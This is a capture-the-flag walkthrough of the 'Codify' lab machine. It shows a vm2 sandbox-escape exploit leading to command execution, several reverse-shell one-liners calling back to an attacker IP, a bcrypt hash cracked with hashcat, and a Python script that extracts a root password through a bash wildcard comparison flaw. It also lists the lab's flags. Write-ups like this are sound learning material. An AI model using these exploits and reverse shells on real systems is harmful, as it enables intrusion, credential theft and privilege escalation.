# Codify

> IP: [10.10.11.239]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.239 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to http://codify.htb/ -> need to add to /etc/hosts
      3. Port 1234 -> http
         1. SimpleHTTPServer 0.6 (Python 3.10.12)
      4. Port 3000 -> ppp?
      5. Port 4445 -> upnotifyp?
3. HTTP
   1. Navigate to website and look at sourcecode
      1. In here it says it is a place to test our node.js code quickly in the browser
         1. /limitations
            1. This tells us we are restricted from using "child_process" and "fs" modules
            2. It also whitelists several modules we can use
               1. url
               2. crypto
               3. util
               4. events
               5. assert
               6. stream
               7. path
               8. os
               9. zlib
         2. /about-us
            1. This is an about section
            2. In here we see that they use the "vm2" library for the sandbox to add extra layer of security
         3. /editor
            1. This is the code form that we can test our code
            2. TEST
               1. Lets try to run console.log
                  1. > console.log("hello");
                     1. RESPONES: hello
                     2. So it does execute code
   2. GOBUSTER
      1. > gobuster dir -x php,txt,html -u http://codify.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         1. /about
         2. /editor
4. RESEARCH
   1. Port 3000 -> ppp
      1. This looks like it is a port used for an express application (with node.js)
   2. VM2
      1. We might be able to exploit this sandbox utility
5. EXPLOIT
   1. Found this code on SNYK Security for CVE-2023-32314
      1. LINK: "https://security.snyk.io/vuln/SNYK-JS-VM2-5537100"
   2. Another useful example is the github repo that is a "Sandbox Escape in vm2"
      1. LINK: "https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9"
   3. CODE:

        ```js
            const { VM } = require("vm2");
            const vm = new VM();

            const code = `
            const err = new Error();
            err.name = {
                toString: new Proxy(() => "", {
                apply(target, thiz, args) {
                    const process = args.constructor.constructor("return process")();
                    throw process.mainModule.require("child_process").execSync("echo hacked").toString();
                },
                }),
            };
            try {
                err.stack;
            } catch (stdout) {
                stdout;
            }
            `;

            console.log(vm.run(code));
        ```

        1. So with this it looks like we can bypass the restriction of the child_process module and can now run commands
        2. Lets test with
           1. .execSync("whoami")
              1. RESPONSE: svc
           2. .execSync("cat /etc/passwd")
              1. ...
              2. joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
              3. svc:x:1001:1001:,,,:/home/svc:/bin/bash
              4. ...
6. EXPLOIT (WTIH REVSHELL)
   1. So we now know this gives us remote code execution so lets try and spawn a revshell
      1. .execSync("bash -i >& /dev/tcp/10.10.14.235/9999 0>&1")
         1. ERROR: /bin/sh: 1: Syntax error: Bad fd number
      2. .execSync("nc -e /bin/sh 10.10.14.235 9999")
         1. ERROR: Command failed: nc -e
      3. .execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.235 9999 >/tmp/f")
         1. SUCCESS
         2. Stabilize revshell
7. ENUMERATION
   1. Check user's home directories
      1. > ls /home
         1. joshua, svc
      2. Can't access joshua
   2. Check files in /var/www/*
      1. We see a folder for contact, editor (probably the node.js sandbox), and html
      2. Lets start with contact
         1. Check out the tickets.db file we see in here
            1. > cat tickets.db

               ```db
                  format 3@  .WJ
                        otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��    tableusersusersCREATE TABLE users (
                        id INTEGER PRIMARY KEY AUTOINCREMENT, 
                        username TEXT UNIQUE, 
                        password TEXT
                  joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2ua  users
                              ickets
                  r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
               ```

               1. This looks like we have a potential username and password hash for joshua
               2. Looking at the index.js file we see that it is a sqlite3 database
8. SQLITE3
   1. Lets try opening the database file with the sqlite3 tool
      1. > sqlite3 tickets.db
      2. > .tables
         1. tickets, users
      3. > select * from users;  
         1. RSEPONSE: "3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2"
         2. Lets try cracking this hash
9. CRACK THE HASH
   1. HASHCAT
      1. Looking at the first bit it looks like it is bcrypt so we will try mode 3200
         1. > hashcat -m 3200 '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' /opt/rockyou.txt
            1. RESPONSE: "$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1"
               1. Now we have a password, lets try loggin in as josh
10. SSH
    1. > ssh joshua@codify.htb
       1. PW: spongebob1
       2. SUCCESS
11. ENUMERATION PT.2
    1. Get user flag
       1. > cat /home/joshua/user.txt
          1. FLAG: `27e908a08327511267902c299778962a`
    2. Check for sudo privileges (if any)
       1. > sudo -l

         ```text
            Matching Defaults entries for joshua on codify:
               env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

            User joshua may run the following commands on codify:
               (root) /opt/scripts/mysql-backup.sh
         ```

         1. So it looks like we can run the mysql-backup.sh script as root
         2. Lets go check this script out
    3. /OPT/SCRIPTS/MYSQL-BACKUP.SH
       1. > ls -la
          1. -rwxr-xr-x 1 root root  928 Nov  2 12:26 mysql-backup.sh
          2. So this is owned by root
       2. > cat mysql-backup.sh

         ```sh
            #!/bin/bash
            DB_USER="root"
            DB_PASS=$(/usr/bin/cat /root/.creds)
            BACKUP_DIR="/var/backups/mysql"

            read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
            /usr/bin/echo

            if [[ $DB_PASS == $USER_PASS ]]; then
                  /usr/bin/echo "Password confirmed!"
            else
                  /usr/bin/echo "Password confirmation failed!"
                  exit 1
            fi

            /usr/bin/mkdir -p "$BACKUP_DIR"

            databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

            for db in $databases; do
               /usr/bin/echo "Backing up database: $db"
               /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
            done

            /usr/bin/echo "All databases backed up successfully!"
            /usr/bin/echo "Changing the permissions"
            /usr/bin/chown root:sys-adm "$BACKUP_DIR"
            /usr/bin/chmod 774 -R "$BACKUP_DIR"
            /usr/bin/echo 'Done!'
         ```

         1. So in the script we see that it requires the user to input a password, then compares to the password stored inthe root/.creds file
            1. The storing user input with the "read -s -p" function makes me think we could inject code here???
         2. If they match then it will make a BACKUP_DIR in /var/backups/mysql
         3. It then dumps the database into a sql file and zips it
         4. Finally it sets the ownership and permissions
    4. Lets go checkout the zipped database files
       1. Cannot navigate to folder - don't have permission

## HELP/HINT NEEDED - CREDIT @Selvakumar

1. So I was sort of on the right track, the vulnerability definitely is in the backup script. However it has nothing to do with injecting code, but rather the password comparison. So we can technically write a python script to piece out the password character by character

## RESUME PROGRESS AFTER HELP

1. VULNERABILITY
   1. So we know the vulnerability comes from the password comparison. Since we can leverage a wildcard (ie. *) and see if it returns "password confirmed!"
2. APPROACH
   1. We will pass through a list of all characters & numbers with the wildcard symbol and check our output for the "Password Confirmed!" response, if so we will append that character to our known list of characters. We repeat the process until all characters are found
3. SCRIPT
   1. Lets build this in python

   ```py
      import string
      import subprocess

      discovered_chars = ""
      all_chars = list(string.ascii_letters + string.digits)

      found_password = False

      while not found_password:
         for char in all_chars:
            command = f"echo '{discovered_chars}{char}'* | sudo /opt/scripts/mysql-backup.sh"
            response = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

            if "Password confirmed!" in response:
               discovered_chars += char
               print(discovered_chars)
               break
            
         else:
            found_password = True
   ```

   1. FOUND PASSWORD: "kljh12k3jhaskjh12kjh3"
4. ESCALATE
   1. Now we have the root password so lets switch users
      1. > su
      2. > cat /root/root.txt
         1. FLAG: `608a7bbb3d383312b4482fa55fdf0028`

## QUESTIONS

1. Submit user flag
   1. `27e908a08327511267902c299778962a`
2. Submit root flag
   1. `608a7bbb3d383312b4482fa55fdf0028`
